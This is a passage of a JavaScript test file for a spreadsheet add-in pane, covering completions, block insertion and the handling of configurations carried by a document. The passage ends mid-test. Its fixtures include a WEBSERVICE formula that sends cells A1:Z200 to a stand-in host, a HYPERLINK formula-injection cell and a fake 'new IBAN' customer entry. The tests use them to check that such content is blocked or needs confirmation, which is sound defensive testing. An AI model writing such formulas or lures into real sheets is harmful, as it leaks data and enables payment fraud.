// The shared pane (pane.js) driven with a fake document and a fake host
// bridge: completions for the selected cell, the chosen spelling written as
// text, blocks and formulas inserted, the pasted configuration kept, a slow
// read that must not overwrite a newer selection, a formula-like start or
// block cell that is not written, and a configuration the document carries
// that is offered, never applied or copied into the browser without asking.
const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");
const sheets = require("../../core/sheets.js");
const { SAMPLE_SECTION } = require("../../desktop/apps/sheets/sample.js");
const { Node, document, sandboxed, plain, storageOf } = require("./fakes.js");

const PANE = path.join(__dirname, "..", "pane.js");
const NOTES = ["Customer called about the late delivery. Promised a call back.", "Customer called about the late delivery.", "Parcel left at the side entrance. Promised a call back."];
const CUSTOMER_CELL = { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed Transport", "Zed Transport"], clipped: false };

// A spreadsheet as the pane's bridge sees it: one selection at a time, writes recorded, a document setting.
function fakeHost(initial) {
  const calls = [];
  let selection = initial;
  let saved = "";
  let handler = null;
  const bridge = {
    readContext: async () => (selection ? plain(selection) : null),
    writeValue: async (target, value) => { calls.push(["value", target, value]); selection.text = value; },
    writeRows: async (target, rows) => calls.push(["rows", target, rows]),
    writeFormula: async (target, formula) => calls.push(["formula", target, formula]),
    loadConfig: async () => saved,
    saveConfig: async (text) => { saved = text; calls.push(["save", text.length]); },
    onSelectionChanged: (fn) => { handler = fn; },
  };
  return { bridge, calls, select: (next) => { selection = next; return handler(); }, config: (text) => { saved = text; }, saved: () => saved, current: () => selection };
}

const Pane = () => sandboxed(PANE).window.ActleSheetsPane;
const settle = () => new Promise((resolve) => setImmediate(resolve));

test("the add-in pane completes the selected cell from the configuration, writes the chosen spelling as text, and inserts blocks", async () => {
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(JSON.stringify(sheets.exportConfig(SAMPLE_SECTION)));
  const root = new Node("div");
  // The organisation's copy is the one kept in the browser; the document carries the same one, so nothing is offered.
  const pane = Pane().createPane({ document, root, bridge: host.bridge, core: sheets, storage: storageOf({ [Pane().STORAGE_KEY]: JSON.stringify(sheets.exportConfig(SAMPLE_SECTION)) }) });
  await pane.start();
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.equal(pane.ui.input.value, "acm");
  assert.equal(pane.ui.summary.textContent, "2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.");
  const buttons = () => pane.ui.completions.all((n) => n.className === "completion");
  assert.deepEqual(buttons().map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"]);
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "source").map((n) => n.textContent), ["vocabulary", "vocabulary"]);
  await buttons()[0].click();
  assert.deepEqual(plain(host.calls.pop()), ["value", { sheet: "Orders 2026", address: "B4" }, "Acme Logistics GmbH"]);
  assert.equal(pane.ui.message.textContent, 'Wrote "Acme Logistics GmbH" to B4.');
  assert.equal(pane.ui.input.value, "Acme Logistics GmbH");
  assert.deepEqual(buttons(), [], "the exact value is not offered again");
  pane.ui.input.value = "Acme Lo";
  await pane.ui.input.fire("input");
  await pane.refresh();
  assert.equal(pane.ui.input.value, "Acme Lo", "a refresh on the same, unchanged cell leaves what is being typed");
  pane.ui.input.value = "zed";
  await pane.ui.input.fire("input");
  assert.deepEqual(buttons().map((b) => b.textContent), ["Zed Transport"]);
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "source").map((n) => n.textContent), ["vocabulary"], "the column's copies count towards the vocabulary value, not as a second entry");
  pane.ui.input.value = "zzz";
  await pane.ui.input.fire("input");
  assert.equal(pane.ui.completions.textContent, "No completion.");
  await host.select({ sheet: "Orders 2026", address: "D4", text: "Driver was late. Prom", header: "Delivery notes", values: NOTES, clipped: true });
  assert.equal(pane.ui.context.textContent, 'D4 on Orders 2026, column "Delivery notes": notes column (first rows only)');
  assert.equal(pane.ui.input.value, "Driver was late. Prom", "a new selection replaces the input");
  assert.deepEqual(buttons().map((b) => b.textContent), ["Promised a call back."]);
  assert.equal(pane.ui.completions.find((n) => n.className === "source").textContent, "seen 2x");
  await buttons()[0].click();
  assert.deepEqual(plain(host.calls.pop()), ["value", { sheet: "Orders 2026", address: "D4" }, "Driver was late. Promised a call back."]);
  await host.select({ sheet: "Budget", address: "A10", text: "", header: "Amount", values: ["100", "250"], clipped: false });
  assert.equal(pane.ui.context.textContent, 'A10 on Budget, column "Amount": number column, 2 values');
  assert.equal(pane.ui.completions.textContent, "", "nothing typed, nothing said");
  pane.ui.input.value = "/exp";
  await pane.ui.input.fire("input");
  const insert = pane.ui.block.button("Insert Expense rows (2 rows x 3 columns)");
  await insert.click();
  assert.deepEqual(plain(host.calls.pop()), ["rows", { sheet: "Budget", address: "A10" }, [["Date", "Amount", "Cost centre"], ["", 0, ""]]]);
  assert.equal(pane.ui.message.textContent, "Inserted Expense rows at A10.");
  assert.equal(pane.ui.input.value, "");
  pane.ui.input.value = "/vat";
  await pane.ui.input.fire("input");
  await pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))").click();
  assert.deepEqual(plain(host.calls.pop()), ["formula", { sheet: "Budget", address: "A10" }, "=ROUND(B2*0.19, 2)"]);
  await host.select({ sheet: "Budget", address: "A11", text: "", header: "", values: [], clipped: false });
  assert.equal(pane.ui.context.textContent, "A11 on Budget, no header in row 1: empty column, 0 values");
  await host.select(null);
  assert.equal(pane.ui.context.textContent, "Select a cell.");
  pane.ui.input.value = "acm";
  await pane.ui.input.fire("input");
  assert.equal(pane.ui.completions.textContent, "", "no cell, no completions");
  host.bridge.writeValue = async () => { throw new Error("read only"); };
  await host.select(plain(CUSTOMER_CELL));
  await buttons()[0].click();
  assert.equal(pane.ui.message.textContent, "Could not write to B4: read only");
  host.bridge.readContext = async () => { throw new Error("gone"); };
  await pane.ui.refresh.click();
  assert.equal(pane.ui.message.textContent, "Cannot read the selection: gone");
});

test("a notes cell whose typed start a host could read as a formula is not written; the person is told why", async () => {
  const host = fakeHost({ sheet: "Orders 2026", address: "D4", text: "+49 reached. Prom", header: "Delivery notes", values: NOTES, clipped: false });
  host.config(JSON.stringify(sheets.exportConfig(SAMPLE_SECTION)));
  // The organisation's copy in this browser applies, so the cells below follow its column rules.
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [Pane().STORAGE_KEY]: JSON.stringify(sheets.exportConfig(SAMPLE_SECTION)) }) });
  await pane.start();
  assert.equal(pane.ui.context.textContent, 'D4 on Orders 2026, column "Delivery notes": notes column', "the organisation's notes rule");
  const buttons = () => pane.ui.completions.all((n) => n.className === "completion");
  assert.deepEqual(buttons().map((b) => b.textContent), ["Promised a call back."], "the completion itself is offered");
  await buttons()[0].click();
  assert.deepEqual(host.calls, [], "nothing was written");
  assert.equal(pane.ui.message.textContent, 'Not written to D4: starting with "+", the cell could read it as a formula. Change the first character, then choose again.');
  assert.equal(pane.ui.input.value, "+49 reached. Prom", "the input keeps what was typed");
  pane.ui.input.value = "Tel. 49 reached. Prom";
  await pane.ui.input.fire("input");
  await buttons()[0].click();
  assert.deepEqual(plain(host.calls.pop()), ["value", { sheet: "Orders 2026", address: "D4" }, "Tel. 49 reached. Promised a call back."]);
  await host.select({ sheet: "Budget", address: "C2", text: "-", header: "Cost centre", values: ["CC-100 Logistics"], clipped: false });
  assert.equal(pane.ui.context.textContent, 'C2 on Budget, column "Cost centre": vocabulary costCentres');
  pane.ui.input.value = "cc";
  await pane.ui.input.fire("input");
  await buttons()[0].click();
  assert.deepEqual(plain(host.calls.pop()), ["value", { sheet: "Budget", address: "C2" }, "CC-100 Logistics"], "a label column replaces the whole text, so the typed start cannot leak");
});

test("a slow read of an earlier selection never overwrites the newer one", async () => {
  const reads = [];
  const bridge = Object.assign(fakeHost(null).bridge, { readContext: () => new Promise((resolve, reject) => reads.push({ resolve, reject })) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge, core: sheets, storage: null });
  const started = pane.start();
  await settle(); // start reads the saved configuration before the selection
  assert.equal(reads.length, 1, "start reads the selection once");
  reads[0].resolve(plain(CUSTOMER_CELL));
  await started;
  assert.equal(pane.ui.input.value, "acm");
  const slow = pane.refresh();  // the selection moved to D4 while A's answer is on its way
  const fast = pane.refresh();
  assert.equal(reads.length, 3);
  reads[2].resolve({ sheet: "Orders 2026", address: "D4", text: "Driver was late. Prom", header: "Delivery notes", values: NOTES, clipped: false });
  await fast;
  assert.equal(pane.ui.input.value, "Driver was late. Prom");
  reads[1].resolve({ sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: [], clipped: false });
  await slow;
  assert.equal(pane.state.context.address, "D4", "the late answer is dropped");
  assert.equal(pane.ui.input.value, "Driver was late. Prom");
  const late = pane.refresh();
  const next = pane.refresh();
  reads[4].resolve(plain(CUSTOMER_CELL));
  await next;
  reads[3].reject(new Error("timed out"));
  await late;
  assert.equal(pane.ui.message.textContent, "", "a stale failure is not reported either");
  assert.equal(pane.ui.input.value, "acm");
});

test("the pane's settings keep the pasted configuration with the document and in the browser, and say what was skipped", async () => {
  const host = fakeHost(plain(CUSTOMER_CELL));
  const storage = storageOf();
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage });
  await pane.start();
  assert.equal(pane.ui.summary.textContent, "No configuration yet: export it from the actle desktop app (extle tab) and paste the file's contents above.");
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 3 values');
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["ACME"], "without a configuration the column's own values complete");
  const section = sheets.exportConfig(SAMPLE_SECTION);
  section.blocks.push({ trigger: "nope" });
  pane.ui.configText.value = JSON.stringify({ version: 1, organization: "Org", sheets: section });
  await pane.ui.save.click();
  assert.deepEqual(plain(host.calls.pop()), ["save", pane.ui.configText.value.length]);
  assert.equal(storage.getItem(Pane().STORAGE_KEY), pane.ui.configText.value);
  assert.equal(pane.ui.message.textContent, "Configuration saved with this document; 1 item(s) skipped, see below.");
  assert.equal(pane.ui.summary.textContent, "2 vocabularies (customers, costCentres), 3 column rules, 2 blocks. Skipped: sheets block nope ignored: trigger must start with / and contain no spaces");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"], "the whole policy's sheets section applies at once");
  pane.ui.configText.value = "{bad";
  await pane.ui.save.click();
  assert.match(pane.ui.summary.textContent, /^0 vocabularies \(\), 0 column rules, 0 blocks\. Skipped: configuration is not valid JSON: /);
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["ACME"]);
  host.bridge.saveConfig = async () => { throw new Error("settings locked"); };
  pane.ui.configText.value = JSON.stringify(sheets.exportConfig(SAMPLE_SECTION));
  await pane.ui.save.click();
  assert.equal(pane.ui.message.textContent, "Configuration saved in this browser only (settings locked).");
  assert.equal(storage.getItem(Pane().STORAGE_KEY), pane.ui.configText.value);
  storage.setItem = () => { throw new Error("quota"); };
  await pane.ui.save.click();
  assert.equal(pane.ui.message.textContent, "Configuration saved nowhere: quota.");
  assert.deepEqual(pane.ui.completions.all((n) => n.className === "completion").map((b) => b.textContent), ["Acme Logistics GmbH", "Northern Acme Ltd"], "it still applies for this session");
  const fromBrowser = fakeHost(plain(CUSTOMER_CELL));
  const second = Pane().createPane({ document, root: new Node("div"), bridge: fromBrowser.bridge, core: sheets, storage });
  await second.start();
  assert.equal(second.ui.summary.textContent, "2 vocabularies (customers, costCentres), 3 column rules, 2 blocks.", "a document without a configuration uses the browser's copy");
  assert.equal(second.ui.configText.value, pane.ui.configText.value);
  const unreadable = fakeHost(plain(CUSTOMER_CELL));
  unreadable.bridge.loadConfig = async () => { throw new Error("boom"); };
  const third = Pane().createPane({ document, root: new Node("div"), bridge: unreadable.bridge, core: sheets, storage: null });
  await third.start();
  assert.equal(third.ui.message.textContent, "Could not read the saved configuration: boom");
  assert.equal(third.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 3 values', "it still runs");
  assert.equal(Pane().describeBlock({ rows: [[1, 2]] }), "1 rows x 2 columns");
});

const ORGANIZATION = JSON.stringify(sheets.exportConfig(SAMPLE_SECTION));
const KEY = "actleSheetsConfig";
const texts = (node, className) => node.all((n) => n.className === className).map((n) => n.textContent);

test("a block's rows are listed under its Insert button, and a text cell a host could read as a formula is not written even when the core let it through", async () => {
  const rows = [["Name", "Approved"], ["=HYPERLINK(\"https://example.invalid/\",\"x\")", "+1+1"]];
  const config = JSON.stringify({ vocabularies: {}, columns: [], blocks: [{ trigger: "/sig", label: "Signature block", rows }] });
  // An older bundle served next to this pane: its parseConfig kept such a block.
  const stale = Object.assign({}, sheets, { parseConfig: (text) => (text ? { config: JSON.parse(text), warnings: [] } : sheets.parseConfig(text)) });
  const host = fakeHost({ sheet: "Orders", address: "A2", text: "/sig", header: "Order", values: [], clipped: false });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: stale, storage: storageOf({ [KEY]: config }) });
  await pane.start();
  const insert = pane.ui.block.button("Insert Signature block (2 rows x 2 columns)");
  assert.deepEqual(pane.ui.block.all((n) => n.tagName === "li").map((n) => n.textContent), ['"Name" | "Approved"', '"=HYPERLINK(\\"https://example.invalid/\\",\\"x\\")" | "+1+1"'], "what the block writes is shown with the button");
  await insert.click();
  assert.deepEqual(host.calls, [], "nothing was written");
  assert.equal(pane.ui.message.textContent, 'Not inserted at A2: row 2, column 1 of Signature block starts with "=", the cell could read it as a formula.');
  const current = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: config }) });
  await current.start();
  assert.equal(current.ui.block.textContent, "", "the core drops the block when it reads the configuration");
  assert.equal(current.ui.summary.textContent, '0 vocabularies (), 0 column rules, 0 blocks. Skipped: sheets block /sig ignored: the cell in row 2, column 1 starts with "=", which a cell would read as a formula');
  const plainBlock = fakeHost({ sheet: "Budget", address: "A10", text: "/exp", header: "Amount", values: [], clipped: false });
  const budget = Pane().createPane({ document, root: new Node("div"), bridge: plainBlock.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await budget.start();
  assert.equal(budget.ui.block.find((n) => n.className === "preview").attrs["aria-label"], "Cells written from A10");
  assert.deepEqual(budget.ui.block.all((n) => n.tagName === "li").map((n) => n.textContent), ['"Date" | "Amount" | "Cost centre"', '"" | 0 | ""']);
  await budget.ui.block.button("Insert Expense rows (2 rows x 3 columns)").click();
  assert.deepEqual(plain(plainBlock.calls.pop()), ["rows", { sheet: "Budget", address: "A10" }, [["Date", "Amount", "Cost centre"], ["", 0, ""]]]);
  const long = Pane().previewRows(Array.from({ length: 7 }, (_, i) => (i ? ["r" + i, true] : ["x".repeat(300)])));
  assert.deepEqual(long.slice(1), ['"r1" | true', '"r2" | true', '"r3" | true', '"r4" | true', "… and 2 more rows"]);
  assert.equal(long[0].length, 200);
  assert.ok(long[0].endsWith("…"));
});

test("a configuration the document carries is offered with its origin and what it changes, never applied or copied into the browser without asking; a formula from it waits for a confirmation naming it", async () => {
  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
  const carried = JSON.stringify({ vocabularies: { customers: ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00"] }, columns: [{ match: { header: "^customer" }, vocabulary: "customers" }], blocks: [{ trigger: "/total", label: "Totals row", formula }] });
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(carried);
  const storage = storageOf({ [KEY]: ORGANIZATION });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage });
  await pane.start();
  const buttons = () => texts(pane.ui.completions, "completion");
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.deepEqual(buttons(), ["Acme Logistics GmbH", "Northern Acme Ltd"], "the organisation's configuration stays in use");
  assert.equal(pane.ui.origin.textContent,
    "This document carries its own extle configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration, which stays in use."
    + "Using the document's would add block \"/total\" (formula " + formula + "); replace vocabulary \"customers\" (1 values instead of 4); remove vocabulary \"costCentres\"; replace the column rules (1 instead of 3); remove block \"/exp\"; remove block \"/vat\"."
    + "Use the document's configuration" + "Keep the organisation's", "the formula block first, names and triggers quoted");
  assert.equal(pane.ui.configText.value, ORGANIZATION, "the box holds the organisation's copy, never the document's");
  const TOTAL = { sheet: "Orders 2026", address: "A3", text: "/total", header: "Order", values: [], clipped: false };
  await host.select(plain(TOTAL));
  assert.equal(pane.ui.block.textContent, "", "the document's trigger does nothing until the person chooses its configuration");
  await host.select(plain(CUSTOMER_CELL));
  await pane.ui.origin.button("Use the document's configuration").click();
  assert.deepEqual(buttons(), ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00", "ACME"], "the document's vocabulary, then the column's own values");
  assert.equal(pane.ui.origin.textContent, "In use: this document's own configuration, not your organisation's. A formula or rows from it are shown for confirmation before they are written.Stop using it");
  assert.equal(pane.ui.message.textContent, "Using this document's configuration for now; your organisation's copy in this browser is unchanged.");
  assert.match(pane.ui.summary.textContent, /^This document's configuration, in use instead of the text above: 1 vocabularies \(customers\), 1 column rules, 1 blocks\.$/);
  assert.equal(storage.getItem(KEY), ORGANIZATION);
  await host.select(plain(TOTAL));
  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
  assert.deepEqual(host.calls, [], "a click on Insert writes nothing yet");
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "This formula comes from this document's configuration, not your organisation's. Write it into A3?");
  assert.equal(pane.ui.block.find((n) => n.className === "formula").textContent, formula, "the formula is shown on its own");
  // The Insert button that had the focus is gone: the status line says why nothing was written, the focus is on Cancel.
  assert.equal(pane.ui.message.textContent, "Nothing written yet: confirm the formula from this document's configuration for A3, or cancel.");
  assert.equal(document.activeElement, pane.ui.block.button("Cancel"), "Cancel, so a second Enter cannot confirm");
  for (const label of ["Write the formula", "Cancel"]) assert.equal(pane.ui.block.button(label).attrs["aria-describedby"], "actle-confirm-question actle-confirm-what", label + " is described by the question and the formula");
  assert.deepEqual([pane.ui.block.find((n) => n.className === "confirm").attrs.id, pane.ui.block.find((n) => n.className === "formula").attrs.id], ["actle-confirm-question", "actle-confirm-what"]);
  await pane.refresh();
  assert.ok(pane.ui.block.button("Write the formula"), "a poll of the same cell keeps the confirmation");
  assert.equal(document.activeElement, pane.ui.block.button("Cancel"), "and the focus follows the redrawn Cancel");
  await pane.ui.block.button("Cancel").click();
  assert.ok(pane.ui.block.button("Insert Totals row (formula " + formula + ")"));
  assert.equal(pane.ui.message.textContent, "Nothing written to A3.");
  assert.equal(document.activeElement, pane.ui.block.button("Insert Totals row (formula " + formula + ")"), "the focus goes back to Insert");
  await pane.refresh();
  assert.equal(document.activeElement, pane.ui.block.button("Insert Totals row (formula " + formula + ")"), "and follows it through a poll");
  assert.deepEqual(host.calls, []);
  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
  await host.select({ sheet: "Orders 2026", address: "A4", text: "/total", header: "Order", values: [], clipped: false });
  assert.equal(pane.ui.block.button("Write the formula"), null, "another cell drops the confirmation");
  assert.equal(pane.ui.message.textContent, "", "and its notice");
  await host.select(plain(TOTAL));
  assert.equal(pane.ui.block.button("Write the formula"), null, "and it does not come back with the first cell");
  await pane.ui.block.button("Insert Totals row (formula " + formula + ")").click();
  await pane.ui.block.button("Write the formula").click();
  assert.deepEqual(plain(host.calls.pop()), ["formula", { sheet: "Orders 2026", address: "A3" }, formula]);
  assert.equal(pane.ui.message.textContent, "Inserted Totals row at A3.");
  await pane.ui.origin.button("Stop using it").click();
  assert.equal(pane.ui.message.textContent, "Back to your organisation's configuration.");
  assert.equal(pane.ui.block.textContent, "");
  assert.match(pane.ui.origin.textContent, /^This document carries its own extle configuration/, "offered again");
  await pane.ui.origin.button("Keep the organisation's").click();
  assert.equal(pane.ui.origin.textContent, "");
  assert.equal(storage.getItem(KEY), ORGANIZATION, "the browser copy never took the document's text");
  await pane.ui.save.click();
  assert.equal(storage.getItem(KEY), ORGANIZATION, "Save keeps the box, the organisation's copy");
  assert.equal(host.saved(), ORGANIZATION, "and gives the document the organisation's configuration");
  assert.equal(pane.ui.message.textContent, "Configuration saved with this document, in place of the different configuration it carried.");
  const same = fakeHost(plain(CUSTOMER_CELL));
  same.config(JSON.stringify(JSON.parse(ORGANIZATION), null, 2));
  const quiet = Pane().createPane({ document, root: new Node("div"), bridge: same.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await quiet.start();
  assert.equal(quiet.ui.origin.textContent, "", "a document carrying the organisation's configuration, however formatted, offers nothing");
  assert.deepEqual(plain(Pane().changes(sheets.parseConfig(ORGANIZATION).config, sheets.parseConfig(ORGANIZATION).config)), []);
  // The order of vocabularies, values and aliases does not change a completion, so it is no change; an alias that means something else is.
  const reordered = JSON.parse(ORGANIZATION);
  reordered.vocabularies = { costCentres: reordered.vocabularies.costCentres, customers: { values: reordered.vocabularies.customers.values.slice().reverse(), aliases: Object.fromEntries(Object.entries(reordered.vocabularies.customers.aliases).reverse()) } };
  const shuffled = fakeHost(plain(CUSTOMER_CELL));
  shuffled.config(JSON.stringify(reordered));
  const calm = Pane().createPane({ document, root: new Node("div"), bridge: shuffled.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await calm.start();
  assert.equal(calm.ui.origin.textContent, "", "the same configuration in another order offers nothing");
  const retargeted = JSON.parse(ORGANIZATION);
  retargeted.vocabularies.customers.aliases.ACME = "Northern Acme Ltd";
  assert.deepEqual(plain(Pane().changes(sheets.parseConfig(ORGANIZATION).config, sheets.parseConfig(JSON.stringify(retargeted)).config)), ['replace vocabulary "customers" (4 values instead of 4)'], "an alias pointing elsewhere is a change");
  const valued = JSON.parse(ORGANIZATION);
  valued.vocabularies.customers.values[3] = "Zed Transport AG";
  assert.deepEqual(plain(Pane().changes(sheets.parseConfig(ORGANIZATION).config, sheets.parseConfig(JSON.stringify(valued)).config)), ['replace vocabulary "customers" (4 values instead of 4)'], "and so is another value");
});

test("with no organisation copy in this browser, the document's configuration is offered, not applied, and using it still writes nothing to the browser", async () => {
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(ORGANIZATION);
  const storage = storageOf();
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage });
  await pane.start();
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": label column, 3 values');
  const NONE_YET = "This document carries its own extle configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration. This browser has none yet: paste the file the actle desktop app exports under Settings."
    + "Using the document's would add block \"/vat\" (formula =ROUND(B2*0.19, 2)); add vocabulary \"customers\" (4 values); add vocabulary \"costCentres\" (3 values); replace the column rules (3 instead of 0); add block \"/exp\" (2 rows x 3 columns)."
    + "Use the document's configuration" + "Not now";
  assert.equal(pane.ui.origin.textContent, NONE_YET);
  assert.equal(pane.ui.configText.value, "");
  for (const copy of ["{}", JSON.stringify({ blocks: [{ trigger: "nope" }] })]) {
    const other = fakeHost(plain(CUSTOMER_CELL));
    other.config(ORGANIZATION);
    const hollow = Pane().createPane({ document, root: new Node("div"), bridge: other.bridge, core: sheets, storage: storageOf({ [KEY]: copy }) });
    await hollow.start();
    assert.equal(hollow.ui.origin.textContent, NONE_YET, copy + ": a browser copy with nothing usable is no organisation configuration to keep");
  }
  await pane.ui.origin.button("Use the document's configuration").click();
  assert.equal(pane.ui.context.textContent, 'B4 on Orders 2026, column "Customer": vocabulary customers');
  assert.equal(storage.getItem(KEY), null);
  await host.select({ sheet: "Budget", address: "A10", text: "/vat", header: "Amount", values: [], clipped: false });
  await pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))").click();
  assert.deepEqual(host.calls, [], "a formula from the document is confirmed first");
  await pane.ui.block.button("Write the formula").click();
  assert.deepEqual(plain(host.calls.pop()), ["formula", { sheet: "Budget", address: "A10" }, "=ROUND(B2*0.19, 2)"]);
  pane.ui.configText.value = ORGANIZATION; // the person pastes the exported file
  await pane.ui.save.click();
  assert.equal(storage.getItem(KEY), ORGANIZATION);
  assert.equal(pane.ui.origin.textContent, "");
  await host.select({ sheet: "Budget", address: "A11", text: "/vat", header: "Amount", values: [], clipped: false });
  await pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))").click();
  assert.deepEqual(plain(host.calls.pop()), ["formula", { sheet: "Budget", address: "A11" }, "=ROUND(B2*0.19, 2)"], "the pasted configuration's formula is written at once");
});

test("a save the browser cannot keep says so, since the browser copy is the one that applies in other documents", async () => {
  const failing = storageOf();
  failing.setItem = () => { throw new Error("quota"); };
  for (const [storage, message] of [[failing, "Configuration saved with this document only (this browser could not keep it: quota)."], [null, "Configuration saved with this document only (this browser cannot keep a copy)."]]) {
    const host = fakeHost(plain(CUSTOMER_CELL));
    const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage });
    await pane.start();
    pane.ui.configText.value = ORGANIZATION;
    await pane.ui.save.click();
    assert.equal(pane.ui.message.textContent, message);
    assert.equal(host.saved(), ORGANIZATION);
    assert.deepEqual(texts(pane.ui.completions, "completion"), ["Acme Logistics GmbH", "Northern Acme Ltd"], "it applies for this session");
  }
});

test("a document that redefines one of the organisation's triggers: the offer names the changed formula, after Use it still waits for a confirmation, and a confirmation left behind writes nothing", async () => {
  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
  const doc = JSON.parse(ORGANIZATION);
  doc.blocks = doc.blocks.map((block) => (block.trigger === "/vat" ? Object.assign({}, block, { formula }) : block));
  const host = fakeHost({ sheet: "Budget", address: "A2", text: "/vat", header: "Amount", values: [], clipped: false });
  host.config(JSON.stringify(doc));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  assert.equal(pane.ui.origin.textContent,
    "This document carries its own extle configuration in its settings. It travels with the file, so whoever saved the file chose it; it is not your organisation's configuration, which stays in use."
    + "Using the document's would change block \"/vat\" (formula " + formula + ")."
    + "Use the document's configuration" + "Keep the organisation's", "the trigger the person already uses, with the document's formula in full");
  assert.ok(pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))"), "until then the organisation's /vat applies");
  await pane.ui.origin.button("Use the document's configuration").click();
  await pane.ui.block.button("Insert VAT at 19% (formula " + formula + ")").click();
  assert.deepEqual(host.calls, [], "the same trigger from the document still waits for a confirmation");
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "This formula comes from this document's configuration, not your organisation's. Write it into A2?");
  assert.equal(pane.ui.block.find((n) => n.className === "formula").textContent, formula);
  const stale = pane.ui.block.button("Write the formula");
  await pane.ui.origin.button("Stop using it").click();
  assert.ok(pane.ui.block.button("Insert VAT at 19% (formula =ROUND(B2*0.19, 2))"), "back to the organisation's /vat");
  await stale.click(); // a reference to the button of a confirmation that is gone
  assert.deepEqual(host.calls, [], "a confirmation left behind writes nothing");
  await pane.ui.origin.button("Use the document's configuration").click();
  await pane.ui.block.button("Insert VAT at 19% (formula " + formula + ")").click();
  await pane.ui.block.button("Write the formula").click();
  assert.deepEqual(plain(host.calls.pop()), ["formula", { sheet: "Budget", address: "A2" }, formula]);
  // /exp is the same in both: a question asked while the document's configuration was in use goes when it stops.
  await host.select({ sheet: "Budget", address: "A5", text: "/exp", header: "Amount", values: [], clipped: false });
  await pane.ui.block.button("Insert Expense rows (2 rows x 3 columns)").click();
  assert.ok(pane.ui.block.button("Write the rows"));
  await pane.ui.origin.button("Stop using it").click();
  assert.equal(pane.ui.block.button("Write the rows"), null, "the organisation's own rows need no question");
  assert.ok(pane.ui.block.button("Insert Expense rows (2 rows x 3 columns)"));
  assert.deepEqual(host.calls, []);
});

test("rows from a document's configuration wait for a confirmation that names the range they replace; the organisation's rows are written at once", async () => {
  const rows = Array.from({ length: 100 }, () => Array(100).fill(""));
  const host = fakeHost({ sheet: "Orders", address: "A4", text: "/exp", header: "Order", values: [], clipped: false });
  host.config(JSON.stringify({ blocks: [{ trigger: "/exp", label: "Expense rows", rows }, { trigger: "/one", label: "One cell", rows: [["x"]] }] }));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  assert.equal(pane.ui.origin.children[1].textContent, 'Using the document\'s would remove vocabulary "customers"; remove vocabulary "costCentres"; replace the column rules (0 instead of 3); change block "/exp" (100 rows x 100 columns); add block "/one" (1 rows x 1 columns); remove block "/vat".');
  await pane.ui.block.button("Insert Expense rows (2 rows x 3 columns)").click();
  assert.deepEqual(plain(host.calls.pop()), ["rows", { sheet: "Orders", address: "A4" }, [["Date", "Amount", "Cost centre"], ["", 0, ""]]], "the organisation's rows: one click, as before");
  pane.ui.input.value = "/exp"; // the cell now starts with "Date"; the trigger is typed again
  await pane.ui.input.fire("input");
  await pane.ui.origin.button("Use the document's configuration").click();
  await pane.ui.block.button("Insert Expense rows (100 rows x 100 columns)").click();
  assert.deepEqual(host.calls, [], "Insert alone writes nothing");
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into A4:CV103, replacing what those 10000 cells hold now?");
  assert.equal(pane.ui.block.all((n) => n.tagName === "li").length, 6, "the rows are listed with the question");
  assert.equal(pane.ui.block.all((n) => n.tagName === "li")[5].textContent, "… and 95 more rows");
